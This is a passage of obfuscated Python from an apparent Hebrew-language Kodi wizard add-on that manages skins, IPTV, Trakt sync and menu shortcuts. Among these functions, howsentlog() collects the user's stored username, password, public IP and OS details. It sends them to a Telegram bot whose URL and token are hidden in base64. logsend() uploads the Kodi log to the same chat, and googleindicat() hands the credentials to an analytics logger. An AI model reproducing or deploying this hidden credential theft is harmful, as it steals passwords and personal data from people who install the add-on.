            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <!-- <include>Object_FlatBackground</include> -->
                    <control type="grouplist" id="3">
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onleft>5</onleft>
                        <onright>5</onright>
                        <width>100%</width>
						<align>right</align>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control>

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
					
                    <control type="grouplist" id="5">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>3</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

            </control>

            <!-- Default Templates -->
            <control type="button" id="7">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="8">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="9">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="11">
                <width>100%</width>
                <height>72</height>
                <texture border="30">common/div.png</texture>
                <include>Defs_OptionButton</include>
            </control>
            <control type="edit" id="12">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="label" id="14">
                <width>100%</width>
                <height>72</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>LineLabel</textcolor>
            </control>
            <control type="sliderex" id="13">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
            <control type="button" id="10">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onleft>3</onleft>
                <onright>3</onright>
                <onup>3</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="28">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="29">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="30">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>
        <control type="label" id="2"><width>1</width><top>-2000</top><height>1</height><visible>false</visible></control>

    </controls>

</window>
''')#line:817
    with open (O0000OOO0O00O000O ,'w')as OOOO0OOO0OOO00O00 :#line:820
      OOOO0OOO0OOO00O00 .write (O0OO000O0OO0000O0 )#line:821
def testcommand ():#line:822
    telemedia_android5fix ()#line:823
def skin_homeselect ():#line:825
	try :#line:827
		OO0OO0OO0OOOO000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:828
		O0OOOOOOOO00O0O00 =open (OO0OO0OO0OOOO000O ,'r')#line:830
		OOO00000OO0000OO0 =O0OOOOOOOO00O0O00 .read ()#line:831
		O0OOOOOOOO00O0O00 .close ()#line:832
		O0O0OOO0O0OO0O00O ='<setting id="HomeS" type="string(.+?)/setting>'#line:833
		O000OOOO00000O000 =re .compile (O0O0OOO0O0OO0O00O ).findall (OOO00000OO0000OO0 )[0 ]#line:834
		O0OOOOOOOO00O0O00 =open (OO0OO0OO0OOOO000O ,'w')#line:835
		O0OOOOOOOO00O0O00 .write (OOO00000OO0000OO0 .replace ('<setting id="HomeS" type="string%s/setting>'%O000OOOO00000O000 ,'<setting id="HomeS" type="string"></setting>'))#line:836
		O0OOOOOOOO00O0O00 .close ()#line:837
	except :#line:838
		pass #line:839
def autotrakt ():#line:842
    OOO00O0O00O0000O0 =(ADDON .getSetting ("auto_trk"))#line:843
    if OOO00O0O00O0000O0 =='true':#line:844
       from resources .libs import trk_aut #line:845
def traktsync ():#line:847
     O000O00OOO000OOO0 =(ADDON .getSetting ("auto_trk"))#line:848
     if O000O00OOO000OOO0 =='true':#line:849
       from resources .libs import trk_aut #line:852
     else :#line:853
        ADDON .openSettings ()#line:854
def imdb_synck ():#line:856
   try :#line:857
     O0O0O000OO00OO0O0 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:858
     OOO000OO00OO00000 =xbmcaddon .Addon ('plugin.video.gaia')#line:859
     O00O00OO00OOO0O0O =(ADDON .getSetting ("imdb_sync"))#line:860
     O0OO000O0O0OO0OO0 ="imdb.user"#line:861
     OOOOOOOO0OOOO0000 ="accounts.informants.imdb.user"#line:862
     O0O0O000OO00OO0O0 .setSetting (O0OO000O0O0OO0OO0 ,str (O00O00OO00OOO0O0O ))#line:863
     OOO000OO00OO00000 .setSetting ('accounts.informants.imdb.enabled','true')#line:864
     OOO000OO00OO00000 .setSetting (OOOOOOOO0OOOO0000 ,str (O00O00OO00OOO0O0O ))#line:865
   except :pass #line:866
def dis_or_enable_addon (OOOOO0O0OO00OOOO0 ,OO0000O000OO00OOO ,enable ="true"):#line:868
    import json #line:869
    OO00OOO0OO0O0O0OO ='"%s"'%OOOOO0O0OO00OOOO0 #line:870
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOOO0O0OO00OOOO0 )and enable =="true":#line:871
        logging .warning ('already Enabled')#line:872
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOOOO0O0OO00OOOO0 )#line:873
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOOO0O0OO00OOOO0 )and enable =="false":#line:874
        return xbmc .log ("### Skipped %s, reason = not installed"%OOOOO0O0OO00OOOO0 )#line:875
    else :#line:876
        OOO000OOOOOO00OO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO00OOO0OO0O0O0OO ,enable )#line:877
        OOO0OOO0OOO0O0OOO =xbmc .executeJSONRPC (OOO000OOOOOO00OO0 )#line:878
        O0O0OOO00O0OOO00O =json .loads (OOO0OOO0OOO0O0OOO )#line:879
        if enable =="true":#line:880
            xbmc .log ("### Enabled %s, response = %s"%(OOOOO0O0OO00OOOO0 ,O0O0OOO00O0OOO00O ))#line:881
        else :#line:882
            xbmc .log ("### Disabled %s, response = %s"%(OOOOO0O0OO00OOOO0 ,O0O0OOO00O0OOO00O ))#line:883
    if OO0000O000OO00OOO =='auto':#line:884
     return True #line:885
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:886
def iptvset ():#line:889
  try :#line:890
    O0OO0O000OOO0OOOO =(ADDON .getSetting ("iptv_on"))#line:891
    if O0OO0O000OOO0OOOO =='true':#line:893
       if KODIV >=17 and KODIV <18 :#line:895
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:896
         O0OOO0OOOOOOOO0OO =xbmcaddon .Addon ('pvr.iptvsimple')#line:897
         O000O0O0OO0O00000 =(ADDON .getSetting ("iptvUrl"))#line:899
         O0OOO0OOOOOOOO0OO .setSetting ('m3uUrl',O000O0O0OO0O00000 )#line:900
         O000000O000O0OO0O =(ADDON .getSetting ("epg_Url"))#line:901
         O0OOO0OOOOOOOO0OO .setSetting ('epgUrl',O000000O000O0OO0O )#line:902
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:905
         iptvsimpldownpc ()#line:906
         wiz .kodi17Fix ()#line:907
         xbmc .sleep (1000 )#line:908
         O0OOO0OOOOOOOO0OO =xbmcaddon .Addon ('pvr.iptvsimple')#line:909
         O000O0O0OO0O00000 =(ADDON .getSetting ("iptvUrl"))#line:910
         O0OOO0OOOOOOOO0OO .setSetting ('m3uUrl',O000O0O0OO0O00000 )#line:911
         O000000O000O0OO0O =(ADDON .getSetting ("epg_Url"))#line:912
         O0OOO0OOOOOOOO0OO .setSetting ('epgUrl',O000000O000O0OO0O )#line:913
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:915
         iptvsimpldown ()#line:916
         wiz .kodi17Fix ()#line:917
         xbmc .sleep (1000 )#line:918
         O0OOO0OOOOOOOO0OO =xbmcaddon .Addon ('pvr.iptvsimple')#line:919
         O000O0O0OO0O00000 =(ADDON .getSetting ("iptvUrl"))#line:920
         O0OOO0OOOOOOOO0OO .setSetting ('m3uUrl',O000O0O0OO0O00000 )#line:921
         O000000O000O0OO0O =(ADDON .getSetting ("epg_Url"))#line:922
         O0OOO0OOOOOOOO0OO .setSetting ('epgUrl',O000000O000O0OO0O )#line:923
  except :pass #line:924
def howsentlog ():#line:931
       try :#line:933
          import json #line:934
          O0O0O0O0OOOOO000O =(ADDON .getSetting ("user"))#line:935
          OOO0OO0OOOO000O00 =(ADDON .getSetting ("pass"))#line:936
          OO00OOO0O0O0O00O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:937
          O00O0O0OO0OO00000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:939
          OO00O00OOOO00O000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:940
          OO00OOO0000OOOOO0 =str (json .loads (OO00O00OOOO00O000 )['ip'])#line:941
          OO00OO000O0O0000O =O0O0O0O0OOOOO000O #line:942
          OO00OOOOO0OO00O00 =OOO0OO0OOOO000O00 #line:943
          xbmc .getInfoLabel ('System.OSVersionInfo')#line:944
          xbmc .sleep (1500 )#line:945
          O0000OOOO0OOOO000 =xbmc .getInfoLabel ('System.OSVersionInfo')#line:946
          import socket #line:948
          OO00O00OOOO00O000 =urllib2 .urlopen (O00O0O0OO0OO00000 .decode ('base64')+' מערכת הפעלה: '+O0000OOOO0OOOO000 +' שם משתמש: '+OO00OO000O0O0000O +' סיסמה: '+OO00OOOOO0OO00O00 +' קודי: '+OO00OOO0O0O0O00O0 +' כתובת: '+OO00OOO0000OOOOO0 ).readlines ()#line:949
       except :pass #line:951
def googleindicat ():#line:954
			import logg #line:955
			OOOOOOOOO000O0000 =(ADDON .getSetting ("pass"))#line:956
			O00OO00OO00O000OO =(ADDON .getSetting ("user"))#line:957
			logg .logGA (OOOOOOOOO000O0000 ,O00OO00OO00O000OO )#line:958
def logsend ():#line:959
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]שולח לוג אנא המתן[/COLOR]'%COLOR2 )#line:960
      O0O0OO0O000OO00OO =xbmcgui .DialogBusy ()#line:961
      O0O0OO0O000OO00OO .create ()#line:962
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:963
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:964
      howsentlog ()#line:966
      import requests #line:967
      if xbmc .getCondVisibility ('system.platform.windows'):#line:968
         O00O0OO0OOOO00OOO =xbmc .translatePath ('special://home/kodi.log')#line:969
         O00O0OO0O00O00000 ={'chat_id':(None ,'-274262389'),'document':(O00O0OO0OOOO00OOO ,open (O00O0OO0OOOO00OOO ,'rb')),}#line:973
         O0O00OOO0O00OO000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:974
         O0O0O000O0OO0000O =requests .post (O0O00OOO0O00OO000 .decode ('base64'),files =O00O0OO0O00O00000 )#line:976
      elif xbmc .getCondVisibility ('system.platform.android'):#line:977
           O00O0OO0OOOO00OOO =xbmc .translatePath ('special://temp/kodi.log')#line:978
           O00O0OO0O00O00000 ={'chat_id':(None ,'-274262389'),'document':(O00O0OO0OOOO00OOO ,open (O00O0OO0OOOO00OOO ,'rb')),}#line:982
           O0O00OOO0O00OO000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:983
           O0O0O000O0OO0000O =requests .post (O0O00OOO0O00OO000 .decode ('base64'),files =O00O0OO0O00O00000 )#line:985
      else :#line:986
           O00O0OO0OOOO00OOO =xbmc .translatePath ('special://kodi.log')#line:987
           O00O0OO0O00O00000 ={'chat_id':(None ,'-274262389'),'document':(O00O0OO0OOOO00OOO ,open (O00O0OO0OOOO00OOO ,'rb')),}#line:991
           O0O00OOO0O00OO000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:992
           O0O0O000O0OO0000O =requests .post (O0O00OOO0O00OO000 .decode ('base64'),files =O00O0OO0O00O00000 )#line:994
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:995
def rdoff ():#line:997
	O0O0OOOO0OOO00O00 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:1028
	O00OOOOO0OOO000OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1029
	copyfile (O0O0OOOO0OOO00O00 ,O00OOOOO0OOO000OO )#line:1030
def skindialogsettind18 ():#line:1031
	try :#line:1032
		OOOOO0OOOOOO0O0O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:1033
		OOO0OOO0000OO0OOO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:1034
		copyfile (OOOOO0OOOOOO0O0O0 ,OOO0OOO0000OO0OOO )#line:1035
	except :pass #line:1036
def rdon ():#line:1037
	loginit .loginIt ('restore','all')#line:1038
	OO00000OO0OO0OO0O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:1040
	OO0O00OOOO000O00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1041
	copyfile (OO00000OO0OO0OO0O ,OO0O00OOOO000O00O )#line:1042
def adults18 ():#line:1044
  OO0O000OOOOOO0O0O =(ADDON .getSetting ("adults"))#line:1045
  if OO0O000OOOOOO0O0O =='true':#line:1046
    OOOOOOO0O0OOOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1047
    with open (OOOOOOO0O0OOOOOO0 ,'r')as O0OO00OO0O000OO00 :#line:1048
      OO0O0OOOOO000OOOO =O0OO00OO0O000OO00 .read ()#line:1049
    OO0O0OOOOO000OOOO =OO0O0OOOOO000OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1067
    with open (OOOOOOO0O0OOOOOO0 ,'w')as O0OO00OO0O000OO00 :#line:1070
      O0OO00OO0O000OO00 .write (OO0O0OOOOO000OOOO )#line:1071
def rdbuildaddon ():#line:1072
  OO00OO0OOO00000O0 =(ADDON .getSetting ("auto_rd"))#line:1073
  if OO00OO0OOO00000O0 =='true':#line:1074
    O0OOOOOO0O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1075
    with open (O0OOOOOO0O00OOOO0 ,'r')as OO0O0O00OO0O0O0O0 :#line:1076
      O00OOOO0OOO0000O0 =OO0O0O00OO0O0O0O0 .read ()#line:1077
    O00OOOO0OOO0000O0 =O00OOOO0OOO0000O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1095
    with open (O0OOOOOO0O00OOOO0 ,'w')as OO0O0O00OO0O0O0O0 :#line:1098
      OO0O0O00OO0O0O0O0 .write (O00OOOO0OOO0000O0 )#line:1099
    O0OOOOOO0O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1103
    with open (O0OOOOOO0O00OOOO0 ,'r')as OO0O0O00OO0O0O0O0 :#line:1104
      O00OOOO0OOO0000O0 =OO0O0O00OO0O0O0O0 .read ()#line:1105
    O00OOOO0OOO0000O0 =O00OOOO0OOO0000O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1123
    with open (O0OOOOOO0O00OOOO0 ,'w')as OO0O0O00OO0O0O0O0 :#line:1126
      OO0O0O00OO0O0O0O0 .write (O00OOOO0OOO0000O0 )#line:1127
    O0OOOOOO0O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1131
    with open (O0OOOOOO0O00OOOO0 ,'r')as OO0O0O00OO0O0O0O0 :#line:1132
      O00OOOO0OOO0000O0 =OO0O0O00OO0O0O0O0 .read ()#line:1133
    O00OOOO0OOO0000O0 =O00OOOO0OOO0000O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1151
    with open (O0OOOOOO0O00OOOO0 ,'w')as OO0O0O00OO0O0O0O0 :#line:1154
      OO0O0O00OO0O0O0O0 .write (O00OOOO0OOO0000O0 )#line:1155
    O0OOOOOO0O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1159
    with open (O0OOOOOO0O00OOOO0 ,'r')as OO0O0O00OO0O0O0O0 :#line:1160
      O00OOOO0OOO0000O0 =OO0O0O00OO0O0O0O0 .read ()#line:1161
    O00OOOO0OOO0000O0 =O00OOOO0OOO0000O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1179
    with open (O0OOOOOO0O00OOOO0 ,'w')as OO0O0O00OO0O0O0O0 :#line:1182
      OO0O0O00OO0O0O0O0 .write (O00OOOO0OOO0000O0 )#line:1183
    O0OOOOOO0O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1186
    with open (O0OOOOOO0O00OOOO0 ,'r')as OO0O0O00OO0O0O0O0 :#line:1187
      O00OOOO0OOO0000O0 =OO0O0O00OO0O0O0O0 .read ()#line:1188
    O00OOOO0OOO0000O0 =O00OOOO0OOO0000O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1206
    with open (O0OOOOOO0O00OOOO0 ,'w')as OO0O0O00OO0O0O0O0 :#line:1209
      OO0O0O00OO0O0O0O0 .write (O00OOOO0OOO0000O0 )#line:1210
    O0OOOOOO0O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1212
    with open (O0OOOOOO0O00OOOO0 ,'r')as OO0O0O00OO0O0O0O0 :#line:1213
      O00OOOO0OOO0000O0 =OO0O0O00OO0O0O0O0 .read ()#line:1214
    O00OOOO0OOO0000O0 =O00OOOO0OOO0000O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1232
    with open (O0OOOOOO0O00OOOO0 ,'w')as OO0O0O00OO0O0O0O0 :#line:1235
      OO0O0O00OO0O0O0O0 .write (O00OOOO0OOO0000O0 )#line:1236
    O0OOOOOO0O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1238
    with open (O0OOOOOO0O00OOOO0 ,'r')as OO0O0O00OO0O0O0O0 :#line:1239
      O00OOOO0OOO0000O0 =OO0O0O00OO0O0O0O0 .read ()#line:1240
    O00OOOO0OOO0000O0 =O00OOOO0OOO0000O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1258
    with open (O0OOOOOO0O00OOOO0 ,'w')as OO0O0O00OO0O0O0O0 :#line:1261
      OO0O0O00OO0O0O0O0 .write (O00OOOO0OOO0000O0 )#line:1262
    O0OOOOOO0O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1265
    with open (O0OOOOOO0O00OOOO0 ,'r')as OO0O0O00OO0O0O0O0 :#line:1266
      O00OOOO0OOO0000O0 =OO0O0O00OO0O0O0O0 .read ()#line:1267
    O00OOOO0OOO0000O0 =O00OOOO0OOO0000O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1285
    with open (O0OOOOOO0O00OOOO0 ,'w')as OO0O0O00OO0O0O0O0 :#line:1288
      OO0O0O00OO0O0O0O0 .write (O00OOOO0OOO0000O0 )#line:1289
def rdbuildinstall ():#line:1292
  try :#line:1293
   O00O000O0OOO0OOOO =(ADDON .getSetting ("auto_rd"))#line:1294
   if O00O000O0OOO0OOOO =='true':#line:1295
     O0O000OO0000O000O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:1296
     OO0OOOO000000O000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1297
     copyfile (O0O000OO0000O000O ,OO0OOOO000000O000 )#line:1298
  except :#line:1299
     pass #line:1300
def rdbuildaddonoff ():#line:1303
    OO0O0OOOO00O0OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1306
    with open (OO0O0OOOO00O0OOO0 ,'r')as O00OOO0OOOO0O000O :#line:1307
      OOO0O0O00OOOOOOO0 =O00OOO0OOOO0O000O .read ()#line:1308
    OOO0O0O00OOOOOOO0 =OOO0O0O00OOOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1326
    with open (OO0O0OOOO00O0OOO0 ,'w')as O00OOO0OOOO0O000O :#line:1329
      O00OOO0OOOO0O000O .write (OOO0O0O00OOOOOOO0 )#line:1330
    OO0O0OOOO00O0OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1334
    with open (OO0O0OOOO00O0OOO0 ,'r')as O00OOO0OOOO0O000O :#line:1335
      OOO0O0O00OOOOOOO0 =O00OOO0OOOO0O000O .read ()#line:1336
    OOO0O0O00OOOOOOO0 =OOO0O0O00OOOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
